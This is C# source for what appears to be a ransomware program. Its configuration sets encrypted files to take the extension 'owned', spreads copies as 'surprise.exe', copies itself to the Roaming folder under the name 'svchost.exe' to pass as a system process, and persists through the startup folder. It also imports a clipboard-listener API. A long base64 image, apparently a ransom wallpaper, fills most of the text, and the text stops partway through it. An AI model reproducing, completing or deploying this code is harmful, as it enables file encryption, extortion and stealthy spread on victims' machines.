using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "owned";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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